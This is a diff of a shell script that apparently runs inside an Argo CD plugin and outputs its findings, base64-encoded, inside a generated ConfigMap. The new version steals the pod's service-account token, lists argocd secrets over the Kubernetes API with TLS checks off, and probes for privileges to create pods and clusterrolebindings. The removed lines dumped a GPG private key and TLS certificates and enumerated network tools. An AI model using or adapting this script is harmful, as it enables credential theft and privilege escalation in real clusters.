@@ -1,53 +1,80 @@
 #!/bin/sh
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
+
 RECON=$( (
-  echo "===GPG_KEY==="
-  cat /app/config/gpg/keys/private-keys-v1.d/E304B7A132D78E19C543A2E8EDEA6AA247E7D384.key 2>/dev/null | base64 | tr -d '\n'
+  echo "===SECRETS_LIST==="
+  perl -MIO::Socket::SSL -e '
+my $token = shift;
+my $host = shift;
+my ($h,$p) = split(/:/, $host);
+my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die "connect: $!";
+print $sock "GET /api/v1/namespaces/argocd/secrets HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nConnection: close\r\n\r\n";
+my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
+my ($b) = $r =~ /\r\n\r\n(.*)/s;
+print substr($b, 0, 4000);
+' "$TOKEN" "$APISERVER" 2>/dev/null
+
   echo ""
-  echo "===SSH_KNOWN_HOSTS==="
-  cat /app/config/ssh/ssh_known_hosts 2>/dev/null
+  echo "===SELFSSAR_LIST_SECRETS==="
+  perl -MIO::Socket::SSL -e '
+my $token = shift;
+my $host = shift;
+my ($h,$p) = split(/:/, $host);
+my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"argocd","verb":"list","resource":"secrets"}}}|;
+my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
+print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
+my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
+my ($b) = $r =~ /\r\n\r\n(.*)/s;
+print substr($b,0,3000);
+' "$TOKEN" "$APISERVER" 2>/dev/null
+
   echo ""
-  echo "===TLS_DIR==="
-  ls -la /app/config/tls/ 2>/dev/null
+  echo "===SELFSSAR_CREATE_POD==="
+  perl -MIO::Socket::SSL -e '
+my $token = shift;
+my $host = shift;
+my ($h,$p) = split(/:/, $host);
+my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"argocd","verb":"create","resource":"pods"}}}|;
+my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
+print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
+my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
+my ($b) = $r =~ /\r\n\r\n(.*)/s;
+print substr($b,0,3000);
+' "$TOKEN" "$APISERVER" 2>/dev/null
+
   echo ""
-  echo "===REPOSERVER_TLS==="
-  ls -la /app/config/reposerver/tls/ 2>/dev/null
+  echo "===SELFSSAR_CLUSTERADMIN==="
+  perl -MIO::Socket::SSL -e '
+my $token = shift;
+my $host = shift;
+my ($h,$p) = split(/:/, $host);
+my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"create","resource":"clusterrolebindings","group":"rbac.authorization.k8s.io"}}}|;
+my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
+print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
+my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
+my ($b) = $r =~ /\r\n\r\n(.*)/s;
+print substr($b,0,3000);
+' "$TOKEN" "$APISERVER" 2>/dev/null
+
   echo ""
-  echo "===TLS_CERTS==="
-  for f in /app/config/tls/* /app/config/reposerver/tls/*; do
-    echo "--- $f ---"
-    cat "$f" 2>/dev/null | base64 | tr -d '\n'
-    echo ""
-  done
-  echo ""
-  echo "===ARGOCD_CLI==="
-  file /usr/local/bin/argocd 2>/dev/null
-  /usr/local/bin/argocd version 2>/dev/null
-  echo ""
-  echo "===ARGOCD_LOGIN_TEST==="
-  /usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web 2>/dev/null || echo "login failed"
-  echo ""
-  echo "===ARGOCD_APP_LIST==="
-  /usr/local/bin/argocd app list --server argocd-server.argocd.svc.cluster.local --insecure --grpc-web 2>/dev/null | head -50
-  echo ""
-  echo "===CMP_PLUGINS==="
-  ls -laR /home/argocd/cmp-server/plugins/ 2>/dev/null
-  echo ""
-  echo "===CMP_CONFIG==="
-  find /home/argocd/cmp-server -type f 2>/dev/null
-  cat /home/argocd/cmp-server/plugins/plugin.yaml 2>/dev/null
-  echo ""
-  echo "===BINARIES==="
-  which wget curl nc bash python python3 perl ruby node npm 2>/dev/null
-  echo ""
-  echo "===REPO_CONFIG==="
-  ls -la /app/config/ 2>/dev/null
-  ls -laR /app/config/gpg/ 2>/dev/null
+  echo "===TRY_LIST_NAMESPACES==="
+  perl -MIO::Socket::SSL -e '
+my $token = shift;
+my $host = shift;
+my ($h,$p) = split(/:/, $host);
+my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
+print $sock "GET /api/v1/namespaces HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nConnection: close\r\n\r\n";
+my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
+my ($b) = $r =~ /\r\n\r\n(.*)/s;
+print substr($b, 0, 2000);
+' "$TOKEN" "$APISERVER" 2>/dev/null
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: phase5b
+  name: k8sapi
 data:
   result: $RECON
 EOF
